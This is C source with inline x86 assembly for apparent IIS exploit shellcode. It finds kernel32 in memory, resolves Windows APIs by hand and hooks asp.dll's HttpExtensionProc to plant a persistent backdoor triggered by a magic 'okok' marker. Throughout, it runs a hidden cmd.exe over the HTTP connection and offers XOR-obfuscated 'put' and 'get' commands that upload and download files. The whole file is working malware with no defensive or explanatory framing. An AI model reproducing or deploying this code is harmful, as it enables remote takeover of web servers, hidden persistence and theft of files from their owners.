
int codeshell(char *codebuff,int bufflen,char *shell,int shelllen)
{
    int i,k;
	unsigned char temp;

    for(i=0,k=0;i<shelllen;++i)
	{
	
		 temp=shell[i];
//		 temp^=DATAXORCODE;
         codebuff[k]=DATABASE+temp/0x10;
		 ++k;
		 codebuff[k]=DATABASE+temp%0x10;
		 ++k;
	}
	

    codebuff[k]=0;
    return k;
}



void  shellcodefnlock()
{
   	_asm{
	          nop
	          nop
	          nop
	          nop
			  nop
			  nop
			  nop
			  nop

//			  pop  eax
//			  pop  eax
//			  pop  eax
			  mov  esi,dword ptr [esp+0xc]
/*
			  mov  eax,dword ptr [esi]
			  dec  eax
			  cmp  al,0x3e
			  jz   next
			  mov  esi,dword ptr [esp+0x10]
*/


next:		  push esi
			  add  dword ptr [esp],0x50
			  pop  esi
              mov  esi,dword ptr[esi+0x50]
 loopdec:	  dec  esi
			  cmp  dword ptr [esi],0x90909090
			  jnz  loopdec
			  push esi
			  pop  ebx
			  push esi
			  jmp  dword ptr [esp]
              nop
			  nop
			  nop
			  nop
			  push 0x48486141
			  add  dword ptr [esp],0x48486215;
              push 0x41412c2e
			  add  dword ptr [esp],0x15152c30
			  push 0x76765562
			  add  dword ptr [esp],0x76755562
			  push 0x02412c56
			  add  byte  ptr [esp],0x56
			  push 0x70450270
              add  dword ptr [esp],0x70450270  
              push 0x60301608
			  add  dword ptr [esp],0x60111607
			  push 0x72013c56
			  add  byte  ptr [esp],0x56
			  push 0x5f56565e
			  push esp
			  pop  esi
			  push ebx         //  ecb 
			  push ebx         //  the call return add 
			  push esi
			  call dword ptr [esp]
			  NOP
			  NOP
			  NOP
			  NOP
			  NOP
			  NOP
			  NOP
			  NOP
			  
	}
}		 
 


int   getapistr(char *buff)
{
 
 int  i;
 char *str="LoadLibraryA""\x0""CreatePipe""\x0"
	   "CreateProcessA""\x0""CloseHandle""\x0"
	   "PeekNamedPipe""\x0"
	   "ReadFile""\x0""WriteFile""\x0"
	   "CreateFileA""\x0"
	   "GetFileSize""\x0"
	   "GetLastError""\x0"
	   "Sleep""\x0"
       "\x09""asp.dll""\x0""HttpExtensionProc""\x0"
	   "\x09""msvcrt.dll""\x0""memcpy""\x0""\x0"
	   "cmd.exe""\x0""\x0d\x0a""exit""\x0d\x0a""\x0"
	   "XORDATA""\x0""xordatareset""\x0"
	   "strend";
 for(i=0;i<0x400;++i)
 { 
	  if(memcmp(str+i,"strend",6)==0) break;
 }	
 memcpy(buff,str,i);
 return i;
}


void findshellcodefn()
{
        
  _asm{
                   
		      add  esp,0x1000
		      add  bx,0x300
   	          mov  ebx,dword ptr [ebx]
			  push ebx
			  call dword ptr [ebx+0x78]
	
	               nop
				   nop
				   nop
				   nop
				   nop
				   nop
				   nop
				   nop
	  }




}




void shellcodefn(char *ecb)
{	char        Buff[SHELLBUFFSIZE+2];
	int         *except[3];


	FARPROC     memcpyadd;
	FARPROC     msvcrtdlladd;
    FARPROC     HttpExtensionProcadd;
    FARPROC     Aspdlladd;
    FARPROC     Sleepadd;
    FARPROC     GetLastErroradd;
    FARPROC     GetFileSizeadd;	
	FARPROC     CreateFileAadd;
	FARPROC     WriteFileadd;
	FARPROC     ReadFileadd;
	FARPROC     PeekNamedPipeadd;
	FARPROC     CloseHandleadd;
	FARPROC     CreateProcessadd;
	FARPROC     CreatePipeadd;
	FARPROC	    procloadlib;

	FARPROC     apifnadd[1];
	FARPROC     procgetadd=0;
    FARPROC     writeclient;
    FARPROC     readclient;
   	HCONN       ConnID;
	FARPROC     shellcodefnadd=ecb;
	char        *stradd,*stradd2,*dooradd;
	int         imgbase,fnbase,i,k,l,thedoor;
	HANDLE      libhandle;
	int         fpt;   //libwsock32;  
    STARTUPINFO siinfo;

    PROCESS_INFORMATION ProcessInformation;
    HANDLE      hReadPipe1,hWritePipe1,hReadPipe2,hWritePipe2;
	int         lBytesRead;
    int  lockintvar1,lockintvar2;
    char lockcharvar;
	int  shelllocknum;
//	unsigned char temp;
	SECURITY_ATTRIBUTES sa;
      

	_asm {            jmp    nextcall
         getstradd:   pop    stradd
					  lea    EDI,except
					  mov    eax,dword ptr FS:[0]
					  mov    dword ptr [edi+0x08],eax
					  mov    dword ptr FS:[0],EDI
	}
	   except[0]=0xffffffff;
	   except[1]=stradd-0x07;

	   imgbase=0x77e00000;
	   _asm{
		  call getexceptretadd
	   }
       for(;imgbase<0xbffa0000,procgetadd==0;){
			imgbase+=0x10000;
			if(imgbase==0x78000000) imgbase=0xbff00000;
			if(*( WORD *)imgbase=='ZM'&& *(WORD *)(imgbase+*(int *)(imgbase+0x3c))=='EP'){
				   fnbase=*(int *)(imgbase+*(int *)(imgbase+0x3c)+0x78)+imgbase;
				   k=*(int *)(fnbase+0xc)+imgbase;
                   if(*(int *)k =='NREK'&&*(int *)(k+4)=='23LE'){
					  libhandle=imgbase;
					  k=imgbase+*(int *)(fnbase+0x20);
					  for(l=0;l<*(int *) (fnbase+0x18);++l,k+=4){
						if(*(int *)(imgbase+*(int *)k)=='PteG'&&*(int *)(4+imgbase+*(int *)k)=='Acor')
						{
						   k=*(WORD *)(l+l+imgbase+*(int *)(fnbase+0x24));
						   k=*(int *)(k+k+k+k+imgbase+*(int *)(fnbase+0x1c));
						   procgetadd=k+imgbase;
						   break;
						}
					  }
				   }
			}
		  }
//搜索KERNEL32。DLL模块地址和API函数 GetProcAddress地址
//注意这儿处理了搜索页面不在情况。

	if(procgetadd==0) goto  die ;

    i=stradd;  

           for(k=1;*stradd!=0;++k) {
				if(*stradd==0x9) libhandle=procloadlib(stradd+1);
				else     apifnadd[k]=procgetadd(libhandle,stradd);
				for(;*stradd!=0;++stradd){
				}
				++stradd;
		   }
		   ++stradd;

	k=stradd;
	stradd=i;
    thedoor=0;

    i=0;
    _asm{
	       		jmp  getdoorcall
getdooradd:     pop  dooradd;
				mov  l,0x10000000  //esp
	    		call getexceptretadd
	}
	if(i==0){
		++i;
        if(*(int *)ecb==0x90){
			if(*(int *)(*(int *)(ecb+0x64))=='okok') {
				i=0;
				thedoor=1;
            }
        } 
	}

    if(i!=0){
       *(int *)(dooradd-0x0c)=HttpExtensionProcadd;
       *(int *)(dooradd-0x13)=shellcodefnadd;
 	  ecb=0;
      _asm{
		  call getexceptretadd
	  }
	  i=ecb;
	  i&=0xfffff000;
      ecb=i;
	  ecb+=0x1000; 

	  for(;i<l;++i,++ecb)
	  {
	    	if(*(int *)ecb==0x90){
				if(*(int *)(ecb+8)==(int *)ecb){
					if(*(int *)*(int *)(ecb+0x64)=='okok')	break;

                }
			} 
 	  } 



      i=0;
      _asm{
		  call getexceptretadd
	  }
 
	  i&=0xfffff000;
	  i+=0x1000;
      for(;i<l;++i){
	 	 if(*(int *)i==HttpExtensionProcadd){
            *(int *)i=dooradd-7;			
		   //	break;
         }	
	  }
      *(int *)(dooradd-0x0c)=HttpExtensionProcadd;

  
	}


    writeclient= *(int *)(ecb+0x84);
    readclient = *(int *)(ecb+0x88);
    ConnID     = *(int *)(ecb+8) ;

    stradd=k;
 

	   _asm{
		   lea edi,except
           mov eax,dword ptr [edi+0x08]   
		   mov dword ptr fs:[0],eax
	   }
	   if(thedoor==0){
		   _asm{
                mov eax,0xffffffff
				mov dword ptr fs:[0],eax 
				mov eax,dword ptr fs:[0x18]
                mov i,eax
		   }

	   }

            stradd2=stradd;
			stradd+=8;
			k=0x20;
            writeclient(ConnID,*(int *)(ecb+0x6c),&k,0);
        /*
            memcpyadd(Buff,stradd+9,8);
			memcpyadd(Buff+8,ecb+0x60,0x20);
            memcpyadd(Buff+0x28,ecb+0x8,0x4);

			k=0x2c;
            writeclient(ConnID,Buff,&k,0);  
*/
/*
            *(int *)Buff=i;
	        k=4;
    		writeclient(ConnID,Buff,&k,0);
            Sleepadd(100); 
 */       
			k=8;
        	writeclient(ConnID,stradd+9,&k,0);
 
            shelllocknum=LOCKBIGNUM2;
			if(*(int *)*(int *)(ecb+0x64)=='ok!!'&&*(int *)(*(int *)(ecb+0x64)+4)=='notx') shelllocknum=0;

	   
// iiscmd:
			lockintvar1=shelllocknum%LOCKBIGNUM;
            lockintvar2=lockintvar1;
 
iiscmd:

/*
            lockintvar1=LOCKBIGNUM2%LOCKBIGNUM;
            lockintvar2=lockintvar1;
 */



	        sa.nLength=12;
            sa.lpSecurityDescriptor=0;
            sa.bInheritHandle=TRUE;
 
            CreatePipeadd(&hReadPipe1,&hWritePipe1,&sa,0);
            CreatePipeadd(&hReadPipe2,&hWritePipe2,&sa,0);


// ZeroMemory(&siinfo,sizeof(siinfo));
            _asm{
 	            lea EDI,siinfo
	            xor eax,eax
	            mov ecx,0x11
	            repnz stosd
			}
    siinfo.dwFlags = STARTF_USESHOWWINDOW|STARTF_USESTDHANDLES;
    siinfo.wShowWindow = SW_HIDE;
    siinfo.hStdInput = hReadPipe2;
    siinfo.hStdOutput=hWritePipe1;
    siinfo.hStdError =hWritePipe1;
	k=0;
//	while(k==0)
//   {


		k=CreateProcessadd(NULL,stradd2,NULL,NULL,1,0,NULL,NULL,&siinfo,&ProcessInformation);
//        stradd+=8;
//	}	

		Sleepadd(200);
//		PeekNamedPipeadd(hReadPipe1,Buff,SHELLBUFFSIZE,&lBytesRead,0,0);
 


	 
//	k=0x20;
//	writeclient(ConnID,*(int *)(ecb+0x64),&k,0);
//    writeclient(ConnID,*(int *)(ecb+0x68),&k,0);
 
   
     
	i=0;
	while(1) {
        PeekNamedPipeadd(hReadPipe1,Buff,SHELLBUFFSIZE,&lBytesRead,0,0);
		if(lBytesRead>0) {
           i=0; 
           ReadFileadd(hReadPipe1,Buff,lBytesRead,&lBytesRead,0);
           if(lBytesRead>0) {
			   for(k=0;k<lBytesRead;++k){
                lockintvar2=lockintvar2*0x100;
				lockintvar2=lockintvar2%LOCKBIGNUM;
				lockcharvar=lockintvar2%0x100;
                Buff[k]^=lockcharvar;   // DATAXORCODE;
//                Buff[k]^=DATAXORCODE;
               }
			   writeclient(ConnID,Buff,&lBytesRead,0); // HSE_IO_SYNC);
//			   Sleepadd(20);
           } 
		}
		else{

  		  	 Sleepadd(10);
             l=0;
			 if(i<50){
				 l=1;
                 ++i;
				 k=1;
				 lBytesRead=0;
			 }
      


            
			
			  while(l==0){
                 i=0;
                 lBytesRead=SHELLBUFFSIZE;
			     k=readclient(ConnID,Buff,&lBytesRead);

                  for(l=0;l<lBytesRead;++l){
                         lockintvar1=lockintvar1*0x100;
			             lockintvar1=lockintvar1%LOCKBIGNUM;
				         lockcharvar=lockintvar1%0x100;
                         Buff[l]^=lockcharvar;   // DATAXORCODE;
				  }
	
				  if(k==1&&lBytesRead>=5&&Buff[0]=='i'&&Buff[1]=='i'&&Buff[2]=='s'&&Buff[3]=='c'&&Buff[4]==' '){
                      k=8;
			          WriteFileadd(hWritePipe2,stradd,k,&k,0); // exit cmd.exe
                      WriteFileadd(hWritePipe2,stradd,k,&k,0); // exit cmd.exe
		              stradd2=Buff+5;
					  Buff[lBytesRead]=0;
					  goto iiscmd;

                  }
                  if(k==1&&lBytesRead>=5&&Buff[0]=='r'&&Buff[1]=='e'&&Buff[2]=='s'&&Buff[3]=='e'&&Buff[4]=='t'){
					
  		    		
					    lBytesRead=0x0c;
                        writeclient(ConnID,stradd+0x11,&lBytesRead,0);

                       	lockintvar1=shelllocknum%LOCKBIGNUM;
                        lockintvar2=lockintvar1;
						lBytesRead=0;
                  }
                  if(k==1&&lBytesRead>=5&&Buff[0]=='i'&&Buff[1]=='i'&&Buff[2]=='s'&&Buff[3]=='r'&&Buff[4]=='r'){
			          k=8;
			          WriteFileadd(hWritePipe2,stradd,k,&k,0); // exit cmd.exe
                      WriteFileadd(hWritePipe2,stradd,k,&k,0); // exit cmd.exe

                      *(int *)(dooradd-0x0c)=0;
					  Sleepadd(0x7fffffff);		      	
					  _asm{
						  mov eax,0
                          mov esp,0
						  jmp eax
                      }					   
                  }

                  

			     if(k==1&&lBytesRead>4&&Buff[0]=='p'&&Buff[1]=='u'&&Buff[2]=='t'&&Buff[3]==' ')
				 {
				    l=*(int *)(Buff+4);
	//				 WriteFileadd(fpt,Buff,lBytesRead,&lBytesRead,NULL); 

	                fpt=CreateFileAadd(Buff+0x8,FILE_FLAG_WRITE_THROUGH+GENERIC_WRITE,FILE_SHARE_READ,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);
                    k=GetLastErroradd();
					i=0;
				    while(l>0){
                       lBytesRead=SHELLBUFFSIZE;
                       k=readclient(ConnID,Buff,&lBytesRead);
                       if(k==1){
						   if(lBytesRead>0){

                               for(k=0;k<lBytesRead;++k){
                                     lockintvar1=lockintvar1*0x100;
			                         lockintvar1=lockintvar1%LOCKBIGNUM;
				                     lockcharvar=lockintvar1%0x100;
                                     Buff[k]^=lockcharvar;   // DATAXORCODE;
							   }
	
                        	 l-=lBytesRead;
						//	 if(fpt>0)
								 WriteFileadd(fpt,Buff,lBytesRead,&lBytesRead,NULL);
//							 else Sleepadd(010);
                           }
						  
//						   if(i>100) l=0;
					   }
					   else {
						   Sleepadd(0100);
                           ++i;
					   } 
					   if(i>10000) l=0;
					}
        
                    CloseHandleadd(fpt);
 			        l=0;
				 }
				 else{
					 if(k==1&&lBytesRead>4&&Buff[0]=='g'&&Buff[1]=='e'&&Buff[2]=='t'&&Buff[3]==' '){
					 
				//		 fpt=CreateFileAadd(Buff+4,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0); 
                     
                         fpt=CreateFileAadd(Buff+4,GENERIC_READ,FILE_SHARE_READ+FILE_SHARE_WRITE,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0); 
                         Sleepadd(100);
						 l=GetFileSizeadd(fpt,&k);
						 *(int *)Buff='ezis';        //size
						 *(int *)(Buff+4)=l;
						 lBytesRead=8;

                          for(i=0;i<lBytesRead;++i){
                              lockintvar2=lockintvar2*0x100;
			                  lockintvar2=lockintvar2%LOCKBIGNUM;
				              lockcharvar=lockintvar2%0x100;
                              Buff[i]^=lockcharvar;   // DATAXORCODE;
						  }
		 


                         writeclient(ConnID,Buff,&lBytesRead,0); // HSE_IO_SYNC);
                   //      Sleepadd(100);
						 i=0;
						 while(l>0){
							  k=SHELLBUFFSIZE; 
                              ReadFileadd(fpt,Buff,k,&k,0);
							  if(k>0){
                                 for(i=0;i<k;++i){
                                      lockintvar2=lockintvar2*0x100;
			                          lockintvar2=lockintvar2%LOCKBIGNUM;
				                      lockcharvar=lockintvar2%0x100;
                                      Buff[i]^=lockcharvar;   // DATAXORCODE;
								 }
		 
                                 i=0;
                                 l-=k;
							     writeclient(ConnID,Buff,&k,0); // HSE_IO_SYNC);
//                                   Sleepadd(100);               
              //                   k=readclient(ConnID,Buff,&lBytesRead);
                  
                   			  }
							  else ++i;
							  if(i>100) l=0;
						 }
						 CloseHandleadd(fpt);

 						 l=0;
					 }
					 else l=1;
				 }


			  }


              if(k!=1){
		    	k=8;
			    WriteFileadd(hWritePipe2,stradd,k,&k,0); // exit cmd.exe
                WriteFileadd(hWritePipe2,stradd,k,&k,0); // exit cmd.exe
		        WriteFileadd(hWritePipe2,stradd,k,&k,0); // exit cmd.exe
                k=GetLastErroradd();
				while(k==0x2746){
                  if(thedoor==1)  	goto asmreturn; 
                  Sleepadd(0x7fffffff);                  //僵死  
				}	
            
			  }
		      else{
     	        WriteFileadd(hWritePipe2,Buff,lBytesRead,&lBytesRead,0);
  //  		    Sleepadd(1000);
			  }
		}
	}
	
    die: goto die  ;

  	_asm{

asmreturn:         
	               mov eax,HSE_STATUS_SUCCESS
	               leave
                   ret 04

door:              push eax
	               mov eax,[esp+0x08]
				   mov eax,[eax+0x64]
				   mov eax,[eax]
				   cmp eax,'okok'
				   jnz jmpold
				   pop eax
				   push 0x12345678  //dooradd-0x13
				   ret        

jmpold:			   pop  eax
				   push 0x12345678   //dooradd-0xc
				   ret               //1
				   jmp  door         //2
getdoorcall:	   call getdooradd   //5
		 

getexceptretadd:   pop  eax
				   push eax
				   mov  edi,dword ptr [stradd]
				   mov dword ptr [edi-0x0e],eax
				   ret
errprogram:		   mov eax,dword ptr [esp+0x0c]
				   add eax,0xb8
				   mov dword ptr [eax],0x11223344  //stradd-0xe
				   xor eax,eax				//2
				   ret						//1
execptprogram:     jmp errprogram			//2 bytes	 stradd-7
nextcall:          call getstradd			//5 bytes
				   NOP
				   NOP
				   NOP
				   NOP
				   NOP
				   NOP
				   NOP
				   NOP
				   NOP
		}		
}
 
